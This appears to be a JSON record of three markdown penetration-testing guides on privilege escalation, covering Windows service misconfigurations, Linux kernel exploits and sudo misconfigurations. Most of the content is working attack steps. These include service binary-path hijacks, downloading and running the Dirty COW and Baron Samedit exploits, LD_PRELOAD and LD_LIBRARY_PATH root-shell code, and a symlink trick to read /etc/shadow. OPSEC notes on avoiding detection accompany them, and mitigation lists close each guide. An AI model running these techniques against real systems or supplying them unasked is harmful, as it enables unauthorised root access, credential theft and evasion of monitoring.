{
  "id": -1,
  "title": "privilege_escalation_testing",
  "documents": [
    {
      "name": "Windows Service Misconfiguration Exploitation",
      "content": "# Windows Service Misconfiguration Exploitation\n\nInsecurely configured Windows services are a common privilege escalation vector. These services may run with SYSTEM privileges while having weak permissions, unquoted paths, or vulnerabilities in their binaries.\n\n## Common Vulnerabilities\n\n### 1. Insecure Service Permissions\n\nWhen non-administrative users can modify service configurations, they may be able to change the service binary path to point to a malicious executable.\n\n### 2. Unquoted Service Paths\n\nWhen service paths containing spaces are not enclosed in quotes, Windows will attempt to execute files at intermediate locations in the path.\n\n### 3. Weak Service Binary Permissions\n\nIf the service binary itself can be modified or replaced by non-administrative users, it can be replaced with a malicious version.\n\n### 4. DLL Hijacking in Services\n\nIf a service loads DLLs without specifying absolute paths, it may be vulnerable to DLL hijacking.\n\n## Enumeration Techniques\n\n1. **Identifying Vulnerable Services** - Using PowerUp.ps1: ```powershell\nImport-Module PowerUp.ps1\nInvoke-AllChecks\n\n# Manually check service permissions\nGet-Service | Select-Object Name, DisplayName, Status\nGet-Acl -Path \"HKLM:\\System\\CurrentControlSet\\Services\\ServiceName\" | Format-List\n\n# Check for services with unquoted paths\nwmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\\\"\"\n``` 2. **Using Accesschk.exe (SysInternals)** - Check service permissions and binary permissions: ```cmd\naccesschk.exe -uwcqv \"Authenticated Users\" *\naccesschk.exe -uwcqv \"Everyone\" *\naccesschk.exe -uwcqv \"Users\" *\n\n# Check binary permissions\naccesschk.exe -wvu \"C:\\Program Files\\Vulnerable Service\\service.exe\"\n```\n\n## Exploitation Methods\n\n1. **Exploiting Insecure Service Permissions** - Create a malicious executable and change service configuration: ```powershell\n$ServiceName = \"VulnService\"\n\nInvoke-ServiceAbuse -Name $ServiceName -Command \"C:\\Temp\\malicious.exe\"\n\nsc.exe config $ServiceName binPath= \"C:\\Temp\\malicious.exe\"\nsc.exe stop $ServiceName\nsc.exe start $ServiceName\n``` 2. **Exploiting Unquoted Service Paths** - Create a malicious executable named \"Program.exe\" in C:\\ and restart the service: ```powershell\nCopy-Item C:\\Temp\\malicious.exe \"C:\\Program.exe\"\n\nsc.exe stop \"Unquoted Path Service\"\nsc.exe start \"Unquoted Path Service\"\n``` 3. **Exploiting Weak Binary Permissions** - Backup the original binary, replace with malicious binary, and restart the service: ```powershell\nCopy-Item \"C:\\Program Files\\Vulnerable Service\\service.exe\" \"C:\\Temp\\original.exe\"\n\nCopy-Item C:\\Temp\\malicious.exe \"C:\\Program Files\\Vulnerable Service\\service.exe\"\n\nsc.exe stop \"Vulnerable Service\"\nsc.exe start \"Vulnerable Service\"\n```\n\n## OPSEC Considerations\n\n- Service manipulation generates Windows Event Logs (7045 for service installation, 7036 for service state changes)\n- Service restarts may cause brief interruptions that could be noticed\n- Modified service binaries may be detected by file integrity monitoring\n- Consider timing service restarts during maintenance windows or system reboots\n\n## Mitigation Strategies\n\n- Use proper quotes around service paths with spaces\n- Restrict service permissions to only administrative users\n- Implement application whitelisting to prevent unauthorized executables\n- Use strong permissions on service binaries and their parent directories\n- Deploy file integrity monitoring for critical system files and service binaries\n- Regularly audit service configurations as part of security assessments\n- Utilize Windows Defender Application Control (WDAC) policies",
      "topics": [
        "privilege-escalation",
        "windows",
        "services",
        "defense-evasion"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    },
    {
      "name": "Linux Kernel Exploitation",
      "content": "# Linux Kernel Exploitation\n\nLinux kernel vulnerabilities can provide attackers with a pathway to escalate privileges from a standard user to root. Kernel exploits target flaws in the core operating system components, allowing them to bypass traditional security controls.\n\n## Vulnerability Identification\n\n### System Information Gathering\n\n```bash\n# Kernel version information\nuname -a\ncat /proc/version\ncat /etc/issue\n\n# Distribution-specific version information\nlsb_release -a\ncat /etc/*-release\n\n# Installed kernel packages\nrpm -qa | grep kernel    # For RPM-based systems\ndpkg -l | grep linux-image    # For Debian-based systems\n```\n\n### Common Vulnerable Configurations\n\n```bash\n# Check for vulnerable kernel modules\nlsmod\n\n# Check for enabled security features\ncat /boot/config-$(uname -r) | grep CONFIG_SECURITY\ncat /boot/config-$(uname -r) | grep CONFIG_SECCOMP\ncat /proc/cpuinfo | grep flags | grep -E 'smep|smap'\n\n# Check for exploit mitigations\nchecksec --kernel\ncat /proc/sys/kernel/unprivileged_bpf_disabled\ncat /proc/sys/kernel/kexec_load_disabled\ncat /proc/sys/kernel/dmesg_restrict\n```\n\n## Common Kernel Exploit Categories\n\n### Use-After-Free (UAF)\n\nOccurs when the kernel continues to use memory after it has been freed, allowing attackers to manipulate memory to execute arbitrary code.\n\n### Race Conditions\n\nTiming vulnerabilities where the kernel makes incorrect assumptions about the state of resources during concurrent operations.\n\n### Memory Corruption\n\nVulnerabilities that allow attackers to write to arbitrary memory locations, potentially overwriting critical kernel data structures.\n\n### Integer Overflows/Underflows\n\nMathematical errors in kernel code that can lead to buffer overflows or other memory corruption issues.\n\n## Exploitation Process\n\n1. **Finding Suitable Exploits** - Search for kernel exploits based on version: ```bash\n# Search for kernel exploits based on version\nsearchsploit linux kernel $(uname -r)\n\n# Check exploit-db\nExploit: https://www.exploit-db.com/exploits/[exploit-id]\n\n# Check established repositories\ngit clone https://github.com/xairy/kernel-exploits\ngit clone https://github.com/SecWiki/linux-kernel-exploits\n``` 2. **Exploit Modification and Compilation** - Install development tools and compile the exploit: ```bash\n# Install development tools if needed\napt-get install -y build-essential libelf-dev linux-headers-$(uname -r)   # Debian/Ubuntu\nyum groupinstall \"Development Tools\"   # CentOS/RHEL\n\n# Compile the exploit\ngcc -o exploit exploit.c\n\n# For more complex exploits with a Makefile\nmake\n``` 3. **Common Exploit Examples** - a. **CVE-2016-5195 (Dirty COW)**: ```bash\n# Download the exploit\nwget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c\n\n# Compile\ngcc -pthread pokemon.c -o dirtycow\n\n# Run the exploit\n./dirtycow /etc/passwd 0\n``` b. **CVE-2021-3156 (Sudo Baron Samedit)**: ```bash\n# Clone the repository\ngit clone https://github.com/blasty/CVE-2021-3156.git\ncd CVE-2021-3156\n\n# Compile and run\nmake\n./sudo-hax-me-a-sandwich\n```\n\n## OPSEC Considerations\n\n- Kernel exploits can crash the system if they fail\n- Failed exploitation attempts often leave traces in system logs\n- Many kernel exploits require specific conditions to work correctly\n- Successful exploits may trigger security monitoring tools that detect privilege escalation\n- Consider using stable, well-tested exploits to minimize system impact\n\n## Mitigation Strategies\n\n- Keep the kernel and system packages updated with security patches\n- Enable kernel security features like SMEP, SMAP, and KASLR\n- Configure SELinux or AppArmor to restrict process capabilities\n- Implement proper user privilege separation\n- Use secure boot mechanisms to validate kernel integrity\n- Monitor for suspicious process activity and privilege escalation\n- Implement robust system auditing and log analysis\n- Apply the principle of least privilege for all user accounts",
      "topics": [
        "privilege-escalation",
        "linux",
        "kernel-exploitation",
        "defense-evasion"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    },
    {
      "name": "SUDO Misconfiguration Exploitation",
      "content": "# SUDO Misconfiguration Exploitation\n\nSUDO misconfigurations are common privilege escalation vectors on Linux systems. When configured improperly, the sudo utility can allow users to execute commands with elevated privileges, potentially leading to complete system compromise.\n\n## Enumeration Techniques\n\n### Checking SUDO Permissions\n\n```bash\n# List current user's sudo permissions\nsudo -l\n\n# Check sudoers file (requires root or sudo)\ncat /etc/sudoers\n\n# Check sudoers.d directory (requires root or sudo)\nls -la /etc/sudoers.d/\ncat /etc/sudoers.d/*\n```\n\n### Common SUDO Misconfigurations\n\n#### 1. Allowed Commands with Wildcards\n\n```bash\n# Example of dangerous sudoers entry\n# username ALL=(ALL) NOPASSWD: /usr/bin/find\n# username ALL=(ALL) NOPASSWD: /usr/bin/*\n\n# Check for wildcards in sudo -l output\nsudo -l | grep \"*\"\n```\n\n#### 2. Environment Variable Preservation\n\n```bash\n# Look for entries with the \"env_keep\" option\nsudo -l | grep env_keep\n\n# Check if SETENV or !SETENV is present in the output\nsudo -l | grep -E 'SETENV|!SETENV'\n```\n\n#### 3. Commands That Can Spawn Shells\n\n```bash\n# Look for markdown editors, utilities that can spawn shells\nsudo -l | grep -E 'vi|vim|nano|less|more|man|python|perl|ruby|bash|sh|csh|ksh|zsh'\n```\n\n## Exploitation Methods\n\n### Exploiting Allowed Binaries\n\n#### Text Editors\n\n```bash\n# Spawn a shell from vim\nsudo vim -c ':!/bin/bash'\n\n# Spawn a shell from nano\nsudo nano\n^R^X # (Ctrl+R then Ctrl+X)\nreset; sh 1>&0 2>&0\n```\n\n#### Command Utilities\n\n```bash\n# Spawn a shell from less/more/man\nsudo less /etc/hosts\n!/bin/bash\n\n# Using find\nsudo find / -name example -exec /bin/bash \\;\n\n# Using python\nsudo python -c 'import os; os.system(\"/bin/bash\")'\n```\n\n### GTFOBins Cheat Sheet\n\nFor a comprehensive list of binaries that can be abused for privilege escalation: https://gtfobins.github.io/\n\n### Exploiting Environment Variables\n\n```bash\n# LD_PRELOAD exploitation\ncat << EOF > /tmp/shell.c\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}\nEOF\n\n# Compile the shared object\ngcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles\n\n# Use LD_PRELOAD with an allowed command\nsudo LD_PRELOAD=/tmp/shell.so find\n```\n\n### Exploiting Wildcards\n\nIf a user can run `/usr/bin/*` with sudo:\n\n```bash\n# Create a malicious script in /tmp\necho '#!/bin/bash' > /tmp/shell.sh\necho 'bash -i' >> /tmp/shell.sh\nchmod +x /tmp/shell.sh\n\n# Create a symlink in allowed directory\nln -s /tmp/shell.sh /usr/bin/shell\n\n# Execute with sudo\nsudo shell\n```\n\n## Real-World Examples\n\n### Example 1: Apache User with Wildcard Permission\n\n```bash\n# Sudoers configuration\n# apache ALL=(ALL) NOPASSWD: /bin/cat /var/www/html/*\n\n# Exploitation\n# Create a symlink to /etc/shadow\nln -s /etc/shadow /var/www/html/shadow.txt\n\n# Read shadow file\nsudo /bin/cat /var/www/html/shadow.txt\n```\n\n### Example 2: User with LD_LIBRARY_PATH\n\n```bash\n# Sudoers configuration\n# user ALL=(ALL) NOPASSWD: /usr/bin/apache2 -f /etc/apache2/apache2.conf\n# Sudo configuration preserves LD_LIBRARY_PATH\n\n# Exploitation\ncat << EOF > /tmp/libcrypt.c\n#include <stdio.h>\n#include <stdlib.h>\n\nstatic void hijack() __attribute__((constructor));\n\nvoid hijack() {\n    system(\"/bin/bash\");\n}\nEOF\n\n# Compile the shared object\ngcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/libcrypt.c\n\n# Use LD_LIBRARY_PATH with the allowed command\nsudo LD_LIBRARY_PATH=/tmp apache2 -f /etc/apache2/apache2.conf\n```\n\n## OPSEC Considerations\n\n- SUDO commands are typically logged in the auth.log file\n- Suspicious commands or patterns may trigger security alerts\n- Creating files or symlinks in world-writeable directories is often monitored\n- Unusual environment variable settings may be flagged by security monitoring\n\n## Mitigation Strategies\n\n- Avoid using wildcards in SUDO rules\n- Restrict the commands users can run with SUDO to only those necessary\n- Use absolute paths in SUDO configurations\n- Restrict environment variable preservation in sudoers (env_reset, !env_keep)\n- Implement SUDO command logging and alerting\n- Use SUDO lecture messages to remind users about proper usage\n- Regularly audit SUDO configurations for potential security issues\n- Consider using more granular access control mechanisms like SELinux or AppArmor",
      "topics": [
        "privilege-escalation",
        "linux",
        "sudo",
        "defense-evasion"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    }
  ],
  "topics": [
    "privilege-escalation",
    "sudo",
    "defense-evasion",
    "services",
    "windows",
    "linux",
    "kernel-exploitation"
  ]
}